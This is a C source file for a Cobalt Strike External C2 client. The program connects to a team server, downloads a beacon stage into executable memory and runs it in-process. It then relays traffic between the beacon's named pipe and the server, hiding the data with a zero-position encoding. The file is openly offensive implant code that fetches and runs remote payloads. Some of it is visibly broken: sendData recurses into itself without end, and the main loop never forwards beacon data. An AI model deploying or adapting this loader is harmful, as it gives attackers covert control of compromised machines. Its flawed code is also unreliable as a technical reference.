/**
 * client.c
 * by Daniel Fitzgerald
 * Jan 2020
 *
 * Program to provide TCP communications for Cobalt Strike using the External C2 feature.
 */

#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment (lib, "Ws2_32.lib")

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>
#include <time.h>

#define MAX 4096
// Mudge used these values in his example
#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

#define SA struct sockaddr


/**
 * Creates a socket connection in Windows
 *
 * @param ip A pointer to a string containing the IP address to connect to
 * @param port A pointer to a string containing the port to connect on
 * @return A socket handle for the connection
 * @pre ip and port form a valid IP address and port number
*/
SOCKET create_socket(char* ip, char* port)
{
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	WSADATA wsaData;
	struct addrinfo* result = NULL, * ptr = NULL, hints;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return INVALID_SOCKET;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	iResult = getaddrinfo(ip, port, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed: %d\n", iResult);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Attempt to connect to the first address returned by the call to getaddrinfo
	ptr = result;

	// Create a SOCKET for connecting to server
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if (ConnectSocket == INVALID_SOCKET) {
		printf("Error at socket(): %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return INVALID_SOCKET;
	}

	// Connect to server.
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}

	// free the resources returned by getaddrinfo and print an error message
	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return INVALID_SOCKET;
	}
	return ConnectSocket;
}



/**
 *  This function decodes the position of a 0 in a packet's payload into a byte.
 *  If there is no 0, this is recoreded as "end transmission". 
 *  @param payload: the string to find the 0 in.
 *  @param end_transmission: a pointer to an end_transmission flag. 
 *  @return the position of the 0 in the payload (0-255), or 256 if no 0.  
 *  @pre len(payload) == 256 bytes. 
 *  @post if there is no 0 byte in the payload, the "end_transmisison" value is set to 1. 
 *  
 */ 
unsigned short decode_position(char* payload) {
	char found = 0;
    unsigned short zero_pos = 0;
	while (found == 0 && zero_pos < 256) {
		if ((unsigned char) payload[zero_pos] == 0) {
			found = 1;
		} else {
			zero_pos++;
		}
	}
    return zero_pos;
}


/**
 *  This function encodes a byte into a string of appropriate length.
 *  @param byte: the byte to encode into the length of the string.
 *  @param payload_str: pointer to a buffer to write the payload string into.
 *  @return a pointer to the head of the payload string of appropriate length.
 *  @pre len(payload_str) == 256.
 */ 
void encode_position(unsigned char byte, char* payload_str) {
	unsigned int i = 0;
	for (i = 0; i < 256; i++) {
		if (i == (unsigned int) byte) {
			payload_str[i] = 0;
		} else {
			payload_str[i] = (rand() % 255) + 1;
		}
	}
}

/**
 *  This function generates a 256-byte end transmission string with no 0.
 *  @param payload_str: pointer to a buffer to write the payload string into.
 *  @return a pointer to the head of the end transmission string.
 *  @pre len(payload_str) == 256.
 */ 
char* encode_end_transmission(char* payload_str) {
    unsigned int i = 0;
    for (i = 0; i < 256; i++) {
        payload_str[i] = ((rand() % 255) + 1);    
    }
    return payload_str;
}


/**
 * Sends data to server received from our injected beacon
 *
 * @param sd A socket file descriptor
 * @param data A pointer to an array containing data to send
 * @param len Length of data to send
*/
void sendData(SOCKET sd, const char* data, DWORD len) {
	
		DWORD byte_counter = 0;
		unsigned char byte = 0;
		char* random_line = malloc(256);
		for (byte_counter = 0; byte_counter < len; byte_counter++) {
			byte = (unsigned char) data[byte_counter];
			encode_position(byte, random_line);
			send(sd, random_line, 256, 0);
			memset(random_line, 0, 256);
		}
		
		//Send "End Transmission" 100 byte packet
		encode_end_transmission(random_line);
		sendData(sd, random_line, 256);
		free(random_line);
}


/**
 * Receives data from our C2 controller to be relayed to the injected beacon
 *
 * @param sd The socket file descriptor
 * @param buffer Buffer to store data in
 * @param max full size of allocated buffer
 * @return Size of data recieved
 * @pre buffer points to an allocated memory region of size max
 * @post buffer contains the data recieved from the team server
*/
DWORD recvData(SOCKET sd, char * buffer, DWORD max) {

	char* random_line = malloc(max);
	unsigned short decoded_value = 300;
	DWORD size = 0, total = 0, done = 0;
	unsigned int i = 0;
	size = recv(sd, random_line, max, 0);

	while (done == 0 && total < max) {
		if (size < 0)
		{
			printf("recvData error, exiting\n");
			break;
		}
		for (i = 0; i <= size/256; i++) { 
			decoded_value = decode_position(&(random_line[256 * i]));
			if (decoded_value > 255) {
				done = 1;
				break;
			} else {
				buffer[total] = (unsigned char) (decoded_value % 256);
			}
			total++;
		}
		
		memset(random_line, 0, max);
		size = recv(sd, random_line, max, 0);
		}
	free(random_line);

	return total;
}


/**
 * Reads a frame from the SMB pipe
 * 
 * @param smb_handle Handle to beacons SMB pipe
 * @param buffer buffer to read data into
 * @param max unused
 * @return size of data read
 */
DWORD read_frame(HANDLE smb_handle, char * buffer, DWORD max) {
	DWORD size = 0, temp = 0, total = 0;
	/* read the 4-byte length */
	ReadFile(smb_handle, (char *)&size, 4, &temp, NULL);

	/* read the whole thing in */
	while (total < size) {
		ReadFile(smb_handle, buffer + total, size - total, &temp, NULL);
		total += temp;
	}

	return size;
}


/**
 * Writes a frame to the SMB pipe
 * 
 * @param smb_handle Handle to beacons SMB pipe
 * @param buffer buffer containing data to send
 * @param length length of data to send
 */
void write_frame(HANDLE smb_handle, char * buffer, DWORD length) {
	DWORD wrote = 0;
	WriteFile(smb_handle, (void *)&length, 4, &wrote, NULL);
	WriteFile(smb_handle, buffer, length, &wrote, NULL);
}







/**
 * Main function. Connects to IRC server over TCP, gets beacon and spawns it, then enters send/recv loop
 *
 */
void main(int argc, char* argv[])
{

	// Set connection and IRC info
	if (argc != 4)
	{
		printf("Incorrect number of args: %d\n", argc);
		printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR]");
		exit(1);
	}

	//seed random number table
	time_t time_seed;
	srand((unsigned int) time(&time_seed));
	
	// Disable crash messages
	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
	// _set_abort_behavior(0,_WRITE_ABORT_MSG);

	char* IP = argv[1];
	char* PORT = argv[2];
	
	char pipe_str[50];
	strcpy(pipe_str, argv[3]);

	DWORD payloadLen = 0;
	char* payloadData = NULL;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	// Create a connection back to our C2 controller
	SOCKET sockfd = INVALID_SOCKET;

	sockfd = create_socket(IP, PORT);
	if (sockfd == INVALID_SOCKET)
	{
		printf("Socket creation error!\n");
		exit(1);
	}

	// Allocate data for receiving beacon payload

	char * payload = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (payload == NULL)
	{
		printf("payload buffer malloc failed!\n");
		exit(1);
	}

	//Receive initial payload data

	DWORD read_size = recvData(sockfd, payload, BUFFER_MAX_SIZE);
	if (read_size < 0) 
	{
		printf("recvData error, exiting\n");
		free(payload);
		exit(1);
	}

	printf("Recv %d byte payload from TS\n", read_size);
	/* inject the payload stage into the current process */

	printf("Injecting payload stage into current process.");
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
	// Loop unstil the pipe is up and ready to use
	while (beaconPipe == INVALID_HANDLE_VALUE) {
		// Create our IPC pipe for talking to the C2 beacon
		Sleep(50);
		// 50 (max size of PIPE_STR) + 13 (size of "\\\\.\\pipe\\")
		char pipestr[50+13]= "\\\\.\\pipe\\";
		// Pipe str (i.e. "mIRC")
		strcat(pipestr, pipe_str);
		// Full string (i.e. "\\\\.\\pipe\\mIRC")
		// Create pipe to connect to. 
		beaconPipe = CreateFileA(pipestr, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);
	}
	printf("Connected to pipe!!\n");

	// Mudge used 1MB max in his example
	char * buffer = (char *)malloc(BUFFER_MAX_SIZE);
	if (buffer == NULL)
	{
		printf("buffer malloc failed!\n");
		free(payload);
		exit(1);
	}



	// The pipe dance
	while (1) {

		// Read frame
		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
		if (read_size < 0)
		{
			printf("read_frame error, exiting\n");
			break;
		}

		//Send data to receiver, 1 byte per packet
		printf("Recv %d bytes from beacon\n", read_size);


		printf("Sent to TS\n");
		

		//Read in data from server. 
		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
		
		printf("Recv %d bytes from TS\n", read_size);
		write_frame(beaconPipe, buffer, read_size);
		printf("Sent to beacon\n");
	}
	//Free all allocated memory and close all memory leaks 
	free(payload);
	free(buffer);
	closesocket(sockfd);
	CloseHandle(beaconPipe);

	exit(0);
}

